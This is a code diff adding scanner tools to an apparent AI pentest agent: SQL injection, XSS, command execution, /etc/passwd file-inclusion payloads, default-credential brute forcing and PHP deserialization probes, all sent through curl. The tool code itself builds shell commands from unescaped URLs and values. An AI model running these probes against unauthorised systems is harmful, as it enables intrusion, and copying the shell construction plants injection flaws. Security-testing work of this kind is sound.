@@ -304,6 +304,109 @@ def register_all_tools(
         execute=lambda summary="": _complete_task(summary),
     ))
 
+    # ========== 新增：爬虫 + 表单测试 + 传统漏洞 ==========
+
+    registry.register(ToolDefinition(
+        name="web_crawl",
+        description="Web页面爬取。从目标URL递归爬取所有页面链接，发现隐藏路径和API端点。",
+        parameters={
+            "type": "object",
+            "properties": {
+                "url": {"type": "string", "description": "起始URL"},
+                "max_pages": {"type": "integer", "description": "最大爬取页面数（默认50）"},
+            },
+            "required": ["url"],
+        },
+        execution_mode="sequential",
+        safety_level="read_only",
+        category="recon",
+        execute=lambda url, max_pages=50: _web_crawl(url, max_pages),
+    ))
+
+    registry.register(ToolDefinition(
+        name="form_test",
+        description="表单漏洞测试。自动解析HTML表单，用POST方式测试SQL注入和XSS。适用于传统Web应用（非API）。",
+        parameters={
+            "type": "object",
+            "properties": {
+                "url": {"type": "string", "description": "包含表单的页面URL"},
+            },
+            "required": ["url"],
+        },
+        execution_mode="sequential",
+        safety_level="controlled",
+        category="scan",
+        execute=lambda url: _form_test(url, pool),
+    ))
+
+    registry.register(ToolDefinition(
+        name="test_rce",
+        description="远程命令/代码执行检测。测试eval()、system()、ping等RCE向量。",
+        parameters={
+            "type": "object",
+            "properties": {
+                "url": {"type": "string", "description": "目标URL"},
+                "param": {"type": "string", "description": "要测试的参数名（可选）"},
+            },
+            "required": ["url"],
+        },
+        execution_mode="sequential",
+        safety_level="restricted",
+        category="scan",
+        execute=lambda url, param="": _test_rce(url, param, pool),
+    ))
+
+    registry.register(ToolDefinition(
+        name="test_lfi",
+        description="文件包含漏洞检测。测试本地文件包含(LFI)和远程文件包含(RFI)。",
+        parameters={
+            "type": "object",
+            "properties": {
+                "url": {"type": "string", "description": "目标URL"},
+                "param": {"type": "string", "description": "要测试的参数名（可选）"},
+            },
+            "required": ["url"],
+        },
+        execution_mode="sequential",
+        safety_level="controlled",
+        category="scan",
+        execute=lambda url, param="": _test_lfi(url, param, pool),
+    ))
+
+    registry.register(ToolDefinition(
+        name="test_bruteforce",
+        description="登录暴力破解测试。尝试常见默认凭据登录。",
+        parameters={
+            "type": "object",
+            "properties": {
+                "login_url": {"type": "string", "description": "登录页面URL"},
+                "username_field": {"type": "string", "description": "用户名字段名（默认username）"},
+                "password_field": {"type": "string", "description": "密码字段名（默认password）"},
+            },
+            "required": ["login_url"],
+        },
+        execution_mode="sequential",
+        safety_level="controlled",
+        category="scan",
+        execute=lambda login_url, username_field="username", password_field="password": _test_bruteforce(login_url, username_field, password_field, pool),
+    ))
+
+    registry.register(ToolDefinition(
+        name="test_deserialization",
+        description="PHP反序列化漏洞检测。测试 unserialize() 相关漏洞。",
+        parameters={
+            "type": "object",
+            "properties": {
+                "url": {"type": "string", "description": "目标URL"},
+            },
+            "required": ["url"],
+        },
+        execution_mode="sequential",
+        safety_level="controlled",
+        category="scan",
+        execute=lambda url: _test_deserialization(url, pool),
+    ))
+
     logger.info("[tools] 注册 %d 个安全工具", len(registry.get_all()))
     return registry
 
@@ -745,3 +848,335 @@ async def _complete_task(summary: str) -> ToolResult:
         content=f"任务完成。{summary}",
         terminate=True,
     )
+
+
+# ========== 新增工具实现 ==========
+
+async def _web_crawl(url: str, max_pages: int) -> ToolResult:
+    """Web 爬取 — 发现所有页面和表单"""
+    from cyberagent.core.crawler import WebCrawler
+
+    crawler = WebCrawler(max_pages=max_pages)
+    results = await crawler.crawl(url)
+
+    pages = results["total_pages"]
+    forms = results["total_forms"]
+    testable = len(crawler.get_testable_forms())
+
+    lines = [f"爬取完成: {pages} 个页面, {forms} 个表单 ({testable} 个可测试)"]
+
+    # 列出发现的表单
+    for form_data in results["forms"][:10]:
+        fields = ", ".join(f["name"] for f in form_data["fields"] if f["type"] != "submit")
+        lines.append(f"  [{form_data['method']}] {form_data['action']} — 字段: {fields}")
+
+    # 列出发现的页面
+    if results["pages"]:
+        lines.append(f"\n发现的页面:")
+        for page in results["pages"][:20]:
+            lines.append(f"  {page['url']} (表单:{page['forms_count']}, 链接:{page['links_count']})")
+
+    return ToolResult(content="\n".join(lines))
+
+
+async def _form_test(url: str, pool) -> ToolResult:
+    """表单漏洞测试 — 解析表单并用 POST 测试 SQLi/XSS"""
+    from cyberagent.core.crawler import WebCrawler
+
+    # 爬取页面获取表单
+    crawler = WebCrawler(max_pages=1)
+    results = await crawler.crawl(url)
+
+    if not results["forms"]:
+        return ToolResult(content=f"未在 {url} 发现表单")
+
+    findings = []
+    import asyncio
+
+    for form_data in results["forms"]:
+        action = form_data["action"]
+        method = form_data["method"]
+        fields = form_data["fields"]
+
+        # 构建正常数据
+        normal_data = {}
+        for f in fields:
+            if f["type"] == "submit":
+                continue
+            if f["value"]:
+                normal_data[f["name"]] = f["value"]
+            elif f["type"] == "password":
+                normal_data[f["name"]] = "test123"
+            else:
+                normal_data[f["name"]] = "test"
+
+        # SQL 注入测试（POST 表单）
+        sqli_payloads = ["'", "' OR '1'='1", "' OR '1'='1' --", "1' AND SLEEP(5)--"]
+        for payload in sqli_payloads[:2]:
+            test_data = dict(normal_data)
+            for field in fields:
+                if field["type"] not in ("submit", "hidden"):
+                    test_data[field["name"]] = payload
+                    break
+
+            data_str = "&".join(f"{k}={shlex.quote(v)}" for k, v in test_data.items())
+            r = await run_command(
+                f"curl -sL -m 10 -X {method} -d '{data_str}' '{action}'",
+                timeout=15,
+            )
+            if r.success:
+                import re
+                sql_errors = re.compile(
+                    r"(?i)(sql syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|SQLSTATE|"
+                    r"You have an error in your SQL syntax)",
+                )
+                if sql_errors.search(r.stdout):
+                    findings.append(f"  [SQLi] {action} — payload: {payload}")
+                    pool.add(SharedFinding(
+                        source="form_test", vuln_type="sqli",
+                        target_url=action, parameter=list(test_data.keys())[0],
+                        payload=payload, severity="critical", confidence="confirmed",
+                        detail=f"POST 表单 SQL 注入",
+                    ))
+                    break
+
+        # XSS 测试（POST 表单）
+        xss_marker = "cyberXSS42"
+        xss_payload = f'<script>{xss_marker}</script>'
+        test_data = dict(normal_data)
+        for field in fields:
+            if field["type"] not in ("submit", "hidden", "password"):
+                test_data[field["name"]] = xss_payload
+                break
+
+        data_str = "&".join(f"{k}={shlex.quote(v)}" for k, v in test_data.items())
+        r = await run_command(
+            f"curl -sL -m 10 -X {method} -d '{data_str}' '{action}'",
+            timeout=15,
+        )
+        if r.success and xss_marker in r.stdout:
+            findings.append(f"  [XSS] {action} — 表单字段反射")
+            pool.add(SharedFinding(
+                source="form_test", vuln_type="xss",
+                target_url=action, parameter=list(test_data.keys())[0],
+                payload=xss_payload, severity="high", confidence="confirmed",
+                detail=f"POST 表单 XSS 反射",
+            ))
+
+    if findings:
+        return ToolResult(content=f"表单测试完成 ({len(findings)} 个发现):\n" + "\n".join(findings))
+    return ToolResult(content=f"表单测试完成: 未发现漏洞 (测试了 {len(results['forms'])} 个表单)")
+
+
+async def _test_rce(url: str, param: str, pool) -> ToolResult:
+    """RCE 检测 — 测试 eval/system/ping 命令执行"""
+    from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
+    import re
+
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+
+    # 如果没有参数，尝试常见 RCE 参数名
+    if not params and not param:
+        rce_params = ["cmd", "exec", "command", "ping", "ip", "host", "shell", "query"]
+        for rp in rce_params:
+            test_url = f"{url}?{rp}=id"
+            r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
+            if r.success and re.search(r'uid=\d+', r.stdout):
+                pool.add(SharedFinding(
+                    source="test_rce", vuln_type="rce",
+                    target_url=test_url, parameter=rp,
+                    payload="id", severity="critical", confidence="confirmed",
+                    detail="RCE via parameter injection",
+                ))
+                return ToolResult(content=f"[CRITICAL] RCE 发现! 参数: {rp}, URL: {test_url}")
+
+        # POST 表单测试
+        for rp in rce_params:
+            r = await run_command(
+                f"curl -sL -m 10 -X POST -d '{rp}=id' '{url}'",
+                timeout=15,
+            )
+            if r.success and re.search(r'uid=\d+', r.stdout):
+                pool.add(SharedFinding(
+                    source="test_rce", vuln_type="rce",
+                    target_url=url, parameter=rp,
+                    payload="id", severity="critical", confidence="confirmed",
+                    detail="RCE via POST parameter injection",
+                ))
+                return ToolResult(content=f"[CRITICAL] RCE 发现! POST 参数: {rp}")
+
+        return ToolResult(content="未发现 RCE 漏洞")
+
+    # 有参数时测试
+    test_params = list(params.keys()) if params else [param]
+    for pname in test_params:
+        test_params_dict = {k: v[0] for k, v in params.items()}
+        test_params_dict[pname] = "id"
+        test_url = urlunparse(parsed._replace(query=urlencode(test_params_dict)))
+
+        r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
+        if r.success and re.search(r'uid=\d+', r.stdout):
+            pool.add(SharedFinding(
+                source="test_rce", vuln_type="rce",
+                target_url=url, parameter=pname,
+                payload="id", severity="critical", confidence="confirmed",
+                detail="RCE via URL parameter",
+            ))
+            return ToolResult(content=f"[CRITICAL] RCE 发现! 参数: {pname}")
+
+    return ToolResult(content="未发现 RCE 漏洞")
+
+
+async def _test_lfi(url: str, param: str, pool) -> ToolResult:
+    """文件包含检测 — LFI/RFI"""
+    from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
+
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+
+    lfi_payloads = [
+        ("../../../etc/passwd", "root:"),
+        ("....//....//....//etc/passwd", "root:"),
+        ("..%2F..%2F..%2Fetc%2Fpasswd", "root:"),
+        ("/etc/passwd", "root:"),
+        ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd"),
+        ("file:///etc/passwd", "root:"),
+    ]
+
+    # 如果没有参数，尝试常见文件参数名
+    if not params and not param:
+        file_params = ["file", "path", "page", "include", "doc", "template", "lang", "filename"]
+        for fp in file_params:
+            for payload, marker in lfi_payloads[:2]:
+                test_url = f"{url}?{fp}={payload}"
+                r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
+                if r.success and marker in r.stdout:
+                    pool.add(SharedFinding(
+                        source="test_lfi", vuln_type="lfi",
+                        target_url=url, parameter=fp,
+                        payload=payload, severity="critical", confidence="confirmed",
+                        detail="LFI file read",
+                    ))
+                    return ToolResult(content=f"[CRITICAL] LFI 发现! 参数: {fp}")
+        return ToolResult(content="未发现文件包含漏洞")
+
+    test_params = list(params.keys()) if params else [param]
+    for pname in test_params:
+        for payload, marker in lfi_payloads:
+            test_params_dict = {k: v[0] for k, v in params.items()}
+            test_params_dict[pname] = payload
+            test_url = urlunparse(parsed._replace(query=urlencode(test_params_dict)))
+
+            r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
+            if r.success and marker in r.stdout:
+                pool.add(SharedFinding(
+                    source="test_lfi", vuln_type="lfi",
+                    target_url=url, parameter=pname,
+                    payload=payload, severity="critical", confidence="confirmed",
+                    detail="LFI file read",
+                ))
+                return ToolResult(content=f"[CRITICAL] LFI 发现! 参数: {pname}")
+
+    return ToolResult(content="未发现文件包含漏洞")
+
+
+async def _test_bruteforce(login_url: str, username_field: str, password_field: str, pool) -> ToolResult:
+    """登录暴力破解测试"""
+    default_creds = [
+        ("admin", "admin"), ("admin", "admin123"), ("admin", "password"),
+        ("admin", "123456"), ("root", "root"), ("root", "toor"),
+        ("test", "test"), ("user", "user"), ("guest", "guest"),
+        ("admin", "pikachu"), ("admin", "12345678"),
+    ]
+
+    # 先获取页面看有没有 CSRF token
+    page_r = await run_command(f"curl -sL -m 10 '{login_url}'", timeout=15)
+    if not page_r.success:
+        return ToolResult(content="无法访问登录页面")
+
+    # 提取可能的 CSRF token
+    import re
+    csrf_match = re.search(
+        r'name=["\'](?:csrf|token|_token|csrf_token)["\'].*?value=["\']([^"\']+)',
+        page_r.stdout, re.IGNORECASE,
+    )
+    csrf_token = csrf_match.group(1) if csrf_match else ""
+
+    results = []
+    for username, password in default_creds:
+        data = f"{username_field}={shlex.quote(username)}&{password_field}={shlex.quote(password)}"
+        if csrf_token:
+            data += f"&token={csrf_token}"
+
+        r = await run_command(
+            f"curl -sL -m 10 -X POST -d '{data}' '{login_url}'",
+            timeout=15,
+        )
+        if r.success:
+            resp = r.stdout.lower()
+            # 检查是否登录成功（不是错误页面）
+            if ("welcome" in resp or "dashboard" in resp or "logout" in resp or "profile" in resp) and \
+               "error" not in resp[:200] and "incorrect" not in resp[:200]:
+                pool.add(SharedFinding(
+                    source="test_bruteforce", vuln_type="bruteforce",
+                    target_url=login_url, parameter="credentials",
+                    payload=f"{username}:{password}",
+                    severity="critical", confidence="confirmed",
+                    detail=f"Default credentials: {username}:{password}",
+                ))
+                results.append(f"  [CRITICAL] {username}:{password} 登录成功!")
+
+    if results:
+        return ToolResult(content=f"暴力破解发现:\n" + "\n".join(results))
+    return ToolResult(content=f"暴力破解完成: 未发现默认凭据 (尝试了 {len(default_creds)} 组)")
+
+
+async def _test_deserialization(url: str, pool) -> ToolResult:
+    """PHP 反序列化检测"""
+    # 测试是否接受序列化数据
+    import base64
+
+    # 简单的 PHP 对象注入 payload
+    php_payloads = [
+        ('O:8:"stdClass":0:{}', "空对象"),
+        ('a:1:{i:0;s:4:"test";}', "数组"),
+        ('O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}', "User对象"),
+    ]
+
+    for payload, desc in php_payloads:
+        encoded = base64.b64encode(payload.encode()).decode()
+
+        # 测试 cookie 注入
+        r = await run_command(
+            f"curl -sL -m 10 -b 'user={encoded}' '{url}'",
+            timeout=15,
+        )
+        if r.success:
+            resp = r.stdout.lower()
+            if "unserialize" in resp or "error" in resp[:500] or "__php_incomplete_class" in resp:
+                pool.add(SharedFinding(
+                    source="test_deserialization", vuln_type="deserialization",
+                    target_url=url, parameter="cookie",
+                    payload=payload[:50], severity="high", confidence="probable",
+                    detail=f"PHP deserialization response: {desc}",
+                ))
+                return ToolResult(content=f"[HIGH] PHP 反序列化可能触发: {desc}")
+
+        # 测试 POST 参数
+        r2 = await run_command(
+            f"curl -sL -m 10 -X POST -d 'data={encoded}' '{url}'",
+            timeout=15,
+        )
+        if r2.success:
+            resp2 = r2.stdout.lower()
+            if "unserialize" in resp2 or "__php_incomplete_class" in resp2:
+                pool.add(SharedFinding(
+                    source="test_deserialization", vuln_type="deserialization",
+                    target_url=url, parameter="data",
+                    payload=payload[:50], severity="high", confidence="probable",
+                    detail=f"PHP deserialization via POST: {desc}",
+                ))
+                return ToolResult(content=f"[HIGH] PHP 反序列化可能触发 (POST): {desc}")
+
+    return ToolResult(content="未发现 PHP 反序列化漏洞")
